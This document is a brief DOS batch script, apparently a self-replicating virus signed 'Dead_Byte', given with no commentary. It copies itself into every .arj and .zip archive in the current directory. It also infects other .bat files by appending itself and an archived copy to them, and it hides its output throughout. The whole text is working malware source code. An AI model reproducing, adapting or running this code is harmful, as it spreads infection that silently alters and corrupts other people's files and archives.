

cls
if "%1"=="7" goto test >nul
for %%a in (*.arj) do arj a -y %%a %0>nul
for %%z in (*.zip) do pkzip %%z %0 >nul	
for %%f in (*.bat) do call %0 7 %%f>nul
goto e

:test
arj l %2 >nul
if errorlevel 1 goto inf
goto e

:inf
arj e %0 >nul
copy %2+virus.vir /b >nul
arj a virus.arj virus.vir >nul
copy %2+virus.arj /b >nul
del virus.arj
del virus.vir
:e

echo 	Dead_Byte


